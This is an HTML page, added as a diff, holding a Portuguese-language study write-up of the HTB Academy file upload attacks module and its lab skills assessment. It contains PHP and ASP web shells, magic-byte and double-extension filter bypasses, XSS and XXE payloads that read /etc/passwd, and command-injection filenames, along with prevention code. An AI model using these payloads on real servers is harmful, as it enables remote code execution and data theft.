@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Upload Attacks — HTB Academy // 0x404</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black:    #000408; --panel: #010d1a; --cyan: #00d4ff; --cyan2: #00aacc;
+      --cyan-dim: #004455; --orange: #ff6600; --white: #e0f7ff; --muted: #3a7a8a;
+      --green: #44ff88; --purple: #cc88ff; --red: #ff4466;
+      --ff-title: 'Orbitron', monospace; --ff-mono: 'Share Tech Mono', monospace;
+      --glow-sm: 0 0 8px #00d4ff88; --glow-md: 0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+    .toc-wrap { position: sticky; top: 52px; z-index: 90; background: rgba(0,4,8,0.97); backdrop-filter: blur(12px); border-bottom: 1px solid var(--cyan-dim); border-top: 1px solid var(--cyan-dim); }
+    .toc { max-width: 900px; margin: 0 auto; padding: 10px 32px; display: flex; align-items: center; gap: 20px; }
+    .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
+    .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
+    .toc li { counter-increment: toc; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a:hover { color: var(--cyan2); }
+    .toc a.active { color: var(--cyan); }
+    .toc a.active::before { color: var(--cyan); }
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-module { border-color: #cc88ff55; color: var(--purple); }
+    .cat-academy { border-color: #00d4ff55; color: var(--cyan2); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 12px; font-weight: 700; color: var(--cyan); letter-spacing: 0.04em; }
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
+    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
+    .callout-warn p { color: #aa6633; margin: 0; }
+    .technique-badge { display: inline-block; font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.1em; padding: 3px 10px; border: 1px solid var(--orange); color: var(--orange); margin-bottom: 12px; }
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="nav-logo">0x404</a>
+    <a href="../research/web-app.html" class="nav-back">Web App Security</a>
+  </div>
+</nav>
+
+<div class="toc-wrap">
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#intro">Introdução</a></li>
+      <li><a href="#absent">Absent Validation</a></li>
+      <li><a href="#exploitation">Web Shells</a></li>
+      <li><a href="#client">Client-Side Bypass</a></li>
+      <li><a href="#blacklist">Blacklist Bypass</a></li>
+      <li><a href="#whitelist">Whitelist Bypass</a></li>
+      <li><a href="#type">Type Filters</a></li>
+      <li><a href="#limited">XSS & XXE</a></li>
+      <li><a href="#other">Other Attacks</a></li>
+      <li><a href="#prevention">Prevention</a></li>
+      <li><a href="#skills">Skills Assessment</a></li>
+    </ol>
+  </nav>
+</div>
+
+<div class="page">
+
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-module">Módulo</span>
+      <span class="wu-cat cat-academy">HTB Academy</span>
+      <span class="wu-date">DEZ 2025</span>
+    </div>
+    <h1 class="wu-title">File Upload Attacks</h1>
+    <p class="wu-desc">
+      Exploração completa de vulnerabilidades em funcionalidades de upload de arquivos — desde validação ausente até bypass de blacklists, whitelists e type filters. Inclui ataques via XSS, XXE em SVG, injeções no nome do arquivo e técnicas de prevenção.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">File Upload</span>
+      <span class="tag">Web Shell</span>
+      <span class="tag">Blacklist Bypass</span>
+      <span class="tag">Whitelist Bypass</span>
+      <span class="tag">MIME Spoofing</span>
+      <span class="tag">XXE via SVG</span>
+      <span class="tag">XSS</span>
+      <span class="tag">PHP</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item">
+        <span class="wi-label">Plataforma</span>
+        <span class="wi-value">HTB Academy</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Tipo</span>
+        <span class="wi-value">Módulo</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Foco</span>
+        <span class="wi-value">Web / Upload</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Seções</span>
+        <span class="wi-value">11</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="wu-content">
+
+    <h2 id="intro">Introdução</h2>
+    <p>Upload de arquivos é um recurso essencial em aplicações web modernas — e também uma das superfícies de ataque mais críticas. Vulnerabilidades de upload estão entre as mais comuns em CVEs recentes, frequentemente classificadas como <strong>High</strong> ou <strong>Critical</strong>.</p>
+
+    <h3>Tipos de Ataque</h3>
+    <ul>
+      <li><strong>Arbitrary File Upload</strong> — upload de qualquer tipo de arquivo, incluindo web shells</li>
+      <li><strong>Client-Side Bypass</strong> — contornar validações implementadas apenas no front-end</li>
+      <li><strong>Blacklist/Whitelist Bypass</strong> — burlar filtros de extensão no back-end</li>
+      <li><strong>Type Filter Bypass</strong> — manipular Content-Type e assinatura MIME</li>
+      <li><strong>Limited Uploads</strong> — XSS/XXE via SVG, HTML ou metadados de imagem</li>
+      <li><strong>Filename Injection</strong> — injeção de comandos, SQLi ou XSS no nome do arquivo</li>
+    </ul>
+
+    <!-- ABSENT VALIDATION -->
+    <h2 id="absent">Absent Validation — Upload Irrestrito</h2>
+    <div class="technique-badge">Vulnerabilidade: Sem Filtros</div>
+
+    <p>O tipo mais básico: a aplicação não implementa nenhuma validação de tipo de arquivo — qualquer extensão é aceita.</p>
+
+    <h3>Identificando o Framework Web</h3>
+    <p>Antes de fazer upload do web shell, precisamos saber qual linguagem executa o servidor. Métodos:</p>
+    <ul>
+      <li>Tentar acessar <code>/index.php</code>, <code>/index.asp</code>, <code>/index.aspx</code></li>
+      <li>Usar a extensão <strong>Wappalyzer</strong> no navegador</li>
+      <li>Fuzzing de extensões com Burp Intruder</li>
+    </ul>
+
+    <figure><img src="file-upload-imgs/absent-wappalyzer.jpg" alt="Wappalyzer identificando PHP no servidor" /></figure>
+
+    <h3>Upload do Web Shell</h3>
+    <p>Confirmado PHP, criamos um web shell simples e fazemos upload diretamente:</p>
+
+    <pre><span class="lang-label">php — web shell</span><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></pre>
+
+    <figure><img src="file-upload-imgs/absent-upload.jpg" alt="Upload do shell.php concluído com sucesso" /></figure>
+    <figure><img src="file-upload-imgs/absent-webshell.jpg" alt="Web shell executando comandos via ?cmd=" /></figure>
+
+    <div class="callout-tip">
+      <div class="cf-title">💡 Web Shells Prontos</div>
+      <p>Use <code>phpbash</code> para uma experiência semi-interativa, ou explore <code>/usr/share/seclists/Web-Shells/</code> para shells em diferentes linguagens (.NET, JSP, etc.).</p>
+    </div>
+
+    <!-- EXPLOITATION -->
+    <h2 id="exploitation">Upload Exploitation — Web Shells & Reverse Shells</h2>
+
+    <h3>Web Shell PHP Personalizado</h3>
+    <pre><span class="lang-label">php</span><code>&lt;?php system($_REQUEST['cmd']); ?&gt;
+# Acesso: http://TARGET/uploads/shell.php?cmd=id</code></pre>
+
+    <h3>Web Shell .NET</h3>
+    <pre><span class="lang-label">asp</span><code>&lt;% eval request('cmd') %&gt;</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Dica</div>
+      <p>Ao visualizar a saída no navegador, use <strong>Ctrl+U</strong> (view-source) para ver o output limpo sem renderização HTML.</p>
+    </div>
+
+    <!-- CLIENT-SIDE -->
+    <h2 id="client">Client-Side Validation Bypass</h2>
+    <div class="technique-badge">Bypass: Front-End Only</div>
+
+    <p>Muitas aplicações validam o tipo de arquivo apenas no JavaScript do front-end. Como o código roda no navegador do cliente, é completamente contornável.</p>
+
+    <h3>Método 1 — Modificar a Requisição via Burp</h3>
+    <p>Selecionar uma imagem legítima, capturar a requisição no Burp e substituir o filename e o conteúdo pelo web shell:</p>
+
+    <figure><img src="file-upload-imgs/client-upload.jpg" alt="Formulário de upload com validação client-side" /></figure>
+    <figure><img src="file-upload-imgs/client-request.jpg" alt="Requisição normal capturada no Burp" /></figure>
+    <figure><img src="file-upload-imgs/client-modified.jpg" alt="Requisição modificada com filename=shell.php" /></figure>
+
+    <h3>Método 2 — Remover a Validação via DevTools</h3>
+    <p>Abrir o DevTools → identificar a função JavaScript de validação → removê-la ou desabilitá-la diretamente no inspector. Sem ela, o formulário aceitará qualquer tipo de arquivo.</p>
+
+    <!-- BLACKLIST -->
+    <h2 id="blacklist">Blacklist Filters Bypass</h2>
+    <div class="technique-badge">Bypass: Extensões Alternativas</div>
+
+    <p>O back-end bloqueia extensões comuns como <code>.php</code>, <code>.php7</code>, <code>.phps</code>, mas a blacklist raramente é completa.</p>
+
+    <figure><img src="file-upload-imgs/blacklist-error.jpg" alt="Mensagem Extension not allowed" /></figure>
+
+    <h3>Fuzzing de Extensões</h3>
+    <p>Usar Burp Intruder com a lista de extensões PHP do PayloadsAllTheThings para identificar quais não estão bloqueadas:</p>
+
+    <figure><img src="file-upload-imgs/blacklist-fuzz.jpg" alt="Burp Intruder fuzzing extensões PHP" /></figure>
+
+    <p>Extensões alternativas que frequentemente escapam da blacklist:</p>
+    <pre><span class="lang-label">extensões php alternativas</span><code>.phtml  .php5  .phar  .pHp  .PHP
+.php3   .php4   .phps  .php7</code></pre>
+
+    <figure><img src="file-upload-imgs/blacklist-shell.jpg" alt="Shell .php5 executado com sucesso" /></figure>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Case Sensitivity</div>
+      <p>Em servidores Windows, nomes de arquivo não diferenciam maiúsculas — tentar <code>.pHp</code> ou <code>.PHP</code> pode bypassar blacklists case-sensitive.</p>
+    </div>
+
+    <!-- WHITELIST -->
+    <h2 id="whitelist">Whitelist Filters Bypass</h2>
+    <div class="technique-badge">Bypass: Double Extension & Null Byte</div>
+
+    <p>Whitelists são mais seguras que blacklists, mas regex mal implementada abre brechas.</p>
+
+    <figure><img src="file-upload-imgs/whitelist-msg.jpg" alt="Mensagem Only images are allowed" /></figure>
+
+    <h3>Double Extension</h3>
+    <p>Se o regex verifica apenas se o nome <em>contém</em> uma extensão permitida (e não se <em>termina</em> com ela):</p>
+
+    <pre><span class="lang-label">php — regex vulnerável</span><code>// Vulnerável — verifica se CONTÉM .jpg
+if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { ... }
+
+// Seguro — verifica se TERMINA com .jpg
+if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }</code></pre>
+
+    <pre><span class="lang-label">bypass</span><code># Double Extension — passa no regex, executa como PHP
+shell.jpg.php
+
+# Reverse Double Extension
+shell.php.jpg</code></pre>
+
+    <figure><img src="file-upload-imgs/whitelist-double.jpg" alt="Double extension shell.jpg.php executado" /></figure>
+
+    <h3>Null Byte Injection</h3>
+    <pre><span class="lang-label">bypass</span><code># Null byte trunca o nome — servidor processa como .php
+shell.php%00.jpg</code></pre>
+
+    <!-- TYPE FILTERS -->
+    <h2 id="type">Type Filters Bypass</h2>
+    <div class="technique-badge">Bypass: Content-Type & MIME Spoofing</div>
+
+    <p>Quando a aplicação valida o <strong>conteúdo</strong> do arquivo além da extensão, dois métodos são usados: verificação do <code>Content-Type</code> header ou da assinatura MIME.</p>
+
+    <h3>Content-Type Bypass</h3>
+    <p>O cabeçalho <code>Content-Type</code> é enviado pelo navegador baseado na extensão — mas pode ser modificado manualmente no Burp:</p>
+
+    <figure><img src="file-upload-imgs/type-content.jpg" alt="Requisição com Content-Type: application/x-php bloqueada" /></figure>
+    <figure><img src="file-upload-imgs/type-bypass.jpg" alt="Content-Type alterado para image/jpg — upload aceito" /></figure>
+
+    <h3>MIME Type Bypass</h3>
+    <p>O servidor pode verificar os primeiros bytes do arquivo (<em>magic bytes</em>) para identificar o tipo real. Para imagens JPEG, os bytes iniciais são <code>FF D8 FF</code>. Adicionamos os magic bytes antes do web shell:</p>
+
+    <pre><span class="lang-label">bash</span><code># Adiciona magic bytes de JPEG ao início do shell PHP
+echo -e '\xff\xd8\xff\xfe' > shell.php
+echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' >> shell.php</code></pre>
+
+    <figure><img src="file-upload-imgs/type-mime.jpg" alt="Shell com MIME spoofing aceito pelo servidor" /></figure>
+
+    <!-- LIMITED / XSS XXE -->
+    <h2 id="limited">Limited Uploads — XSS & XXE</h2>
+    <div class="technique-badge">Ataques sem Upload Arbitrário</div>
+
+    <p>Mesmo quando só imagens são aceitas, alguns ataques ainda são possíveis.</p>
+
+    <h3>XSS via Metadados de Imagem</h3>
+    <pre><span class="lang-label">bash</span><code>$ exiftool -Comment='&gt;"&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg</code></pre>
+
+    <h3>XSS via SVG</h3>
+    <pre><span class="lang-label">xml — HTB.svg</span><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "..."&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1"&gt;
+    &lt;script type="text/javascript"&gt;alert(window.origin);&lt;/script&gt;
+&lt;/svg&gt;</code></pre>
+
+    <h3>XXE via SVG — Leitura de Arquivos</h3>
+    <pre><span class="lang-label">xml — leitura de /etc/passwd</span><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;</code></pre>
+
+    <pre><span class="lang-label">xml — leitura de código-fonte PHP</span><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM
+  "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;</code></pre>
+
+    <!-- OTHER ATTACKS -->
+    <h2 id="other">Other Upload Attacks</h2>
+
+    <h3>Filename Injection</h3>
+    <pre><span class="lang-label">exemplos de payloads no nome do arquivo</span><code># Command Injection
+file$(whoami).jpg
+file`whoami`.jpg
+file.jpg||whoami
+
+# XSS
+&lt;script&gt;alert(window.origin);&lt;/script&gt;.jpg
+
+# SQL Injection
+file';select+sleep(5);--.jpg</code></pre>
+
+    <h3>Upload Directory Disclosure</h3>
+    <ul>
+      <li>Forçar erros enviando arquivo com nome já existente</li>
+      <li>Enviar nome de arquivo muito longo (+5000 chars)</li>
+      <li>Usar XXE/LFI para ler o código-fonte e encontrar o diretório</li>
+    </ul>
+
+    <h3>Windows-Specific</h3>
+    <ul>
+      <li>Caracteres reservados: <code>|</code>, <code>&lt;</code>, <code>&gt;</code>, <code>*</code>, <code>?</code></li>
+      <li>Nomes reservados: <code>CON</code>, <code>COM1</code>, <code>LPT1</code>, <code>NUL</code></li>
+      <li>Convenção 8.3: <code>HACKTH~1.TXT</code> referencia <code>hackthebox.txt</code></li>
+    </ul>
+
+    <!-- PREVENTION -->
+    <h2 id="prevention">Prevention</h2>
+
+    <h3>Validação de Extensão (Blacklist + Whitelist)</h3>
+    <pre><span class="lang-label">php</span><code>$fileName = basename($_FILES["uploadFile"]["name"]);
+
+// blacklist — bloqueia extensões perigosas em qualquer posição
+if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
+    echo "Only images are allowed"; die();
+}
+
+// whitelist — exige que TERMINE com extensão de imagem
+if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
+    echo "Only images are allowed"; die();
+}</code></pre>
+
+    <h3>Validação de Conteúdo</h3>
+    <pre><span class="lang-label">php</span><code>$contentType = $_FILES['uploadFile']['type'];
+$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!in_array($type, array('image/png', 'image/jpeg'))) {
+        echo "Only images are allowed"; die();
+    }
+}</code></pre>
+
+    <h3>Boas Práticas Adicionais</h3>
+    <ul>
+      <li>Randomizar nomes dos arquivos armazenados, guardar original no banco</li>
+      <li>Armazenar uploads fora do webroot ou em servidor/container separado</li>
+      <li>Servir downloads via script controlado (<code>download.php</code>) com headers de segurança</li>
+      <li>Desabilitar funções perigosas: <code>disable_functions = exec,shell_exec,system,passthru</code></li>
+      <li>Restringir o diretório de uploads com <code>open_basedir</code> (PHP)</li>
+      <li>Retornar <code>403 Forbidden</code> para acesso direto ao diretório de uploads</li>
+    </ul>
+
+    <!-- SKILLS ASSESSMENT -->
+    <h2 id="skills">Skills Assessment</h2>
+
+    <p>Aplicação de e-commerce com formulário de upload em <strong>Contact Us</strong>. Objetivo: obter RCE no servidor back-end.</p>
+
+    <figure><img src="file-upload-imgs/skills-01.png" alt="Aplicação de e-commerce alvo" /></figure>
+    <figure><img src="file-upload-imgs/skills-02.png" alt="Campo de upload em Contact Us identificado" /></figure>
+
+    <h3>Passo 1 — XXE via SVG para ler o código-fonte</h3>
+    <p>Enviando SVG malicioso para ler o arquivo <code>upload.php</code>:</p>
+
+    <pre><span class="lang-label">xml</span><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM
+  "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;</code></pre>
+
+    <figure><img src="file-upload-imgs/skills-03.png" alt="XXE lendo upload.php em base64" /></figure>
+
+    <h3>Passo 2 — Análise do código-fonte</h3>
+    <p>Decodificando o base64, identificamos as validações:</p>
+    <ul>
+      <li><strong>Blacklist</strong>: <code>/.+\.ph(p|ps|tml)/</code> — bloqueia <code>.php</code>, <code>.phps</code>, <code>.phtml</code> mas <strong>não</strong> <code>.phar</code></li>
+      <li><strong>Whitelist regex</strong>: <code>/^.+\.[a-z]{2,3}g$/</code> — exige que termine com letra <code>g</code> (ex: <code>.jpg</code>, <code>.png</code>)</li>
+      <li><strong>MIME check</strong>: verifica <code>Content-Type</code> e MIME type real</li>
+      <li><strong>Diretório</strong>: <code>./user_feedback_submissions/</code></li>
+      <li><strong>Naming</strong>: <code>date('ymd') . '_' . filename</code></li>
+    </ul>
+
+    <figure><img src="file-upload-imgs/skills-04.png" alt="Código-fonte upload.php decodificado" /></figure>
+
+    <h3>Passo 3 — Montando o bypass</h3>
+    <p>Extensão <code>.phar</code> não está na blacklist e termina com <code>r</code> — não passa no whitelist <code>[a-z]{2,3}g$</code>. Solução: usar <code>.phar.jpg</code> (double extension) que termina com <code>g</code> e não contém <code>.ph(p|ps|tml)</code>.</p>
+
+    <pre><span class="lang-label">burp — requisição modificada</span><code>Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpg"
+Content-Type: image/jpeg
+
+ÿØÿþ-     ← magic bytes JPEG
+&lt;?php system($_REQUEST['cmd']); ?&gt;</code></pre>
+
+    <figure><img src="file-upload-imgs/skills-05.png" alt="Requisição com shell.phar.jpg e magic bytes" /></figure>
+    <figure><img src="file-upload-imgs/skills-06.png" alt="Upload aceito com sucesso" /></figure>
+
+    <h3>Passo 4 — RCE</h3>
+    <pre><span class="lang-label">url</span><code>http://TARGET/contact/user_feedback_submissions/251231_shell.phar.jpg?cmd=id</code></pre>
+
+    <figure><img src="file-upload-imgs/skills-07.png" alt="RCE confirmado com saída do comando id" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Skills Assessment — RCE Obtido</div>
+      <p>Bypass via double extension <code>.phar.jpg</code> + magic bytes JPEG + MIME spoofing. Diretório: <code>./user_feedback_submissions/</code>.</p>
+    </div>
+
+  </div>
+
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2025 · fstringuetta</span>
+  </footer>
+
+</div>
+
+<script>
+  const sections = document.querySelectorAll('.wu-content h2[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.toc a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
